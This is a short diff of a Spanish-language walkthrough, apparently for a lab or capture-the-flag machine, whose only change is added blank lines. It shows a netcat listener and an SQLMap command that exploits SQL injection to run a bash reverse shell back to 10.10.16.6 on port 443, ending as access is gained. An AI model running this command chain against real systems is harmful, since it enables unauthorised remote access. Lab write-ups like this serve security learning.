@@ -217,16 +217,19 @@ Table: users
 
 - Intentamos crackear el `hash` pero tampoco van por ahí los tiros por lo que vamos a intentar si a través de `SQLMap` nos podemos entablar una `reverse-shell`
 Nos ponemos en escucha por el puerto `443` en nuestra maquina
+
 ```bash
 nc -nlvp 443
 ```
 
 - Y ejecutamos el siguiente comando con `SQLMap`
+
 ```bash
 ❯ sqlmap -r request.txt -p username --batch --force-ssl --os-cmd 'bash -c "bash -i >& /dev/tcp/10.10.16.6/443 0>&1"'
 ```
 
 - Ganamos acceso al sistema
+
 ```bash
 ❯ nc -nlvp 443
 Listening on 0.0.0.0 443
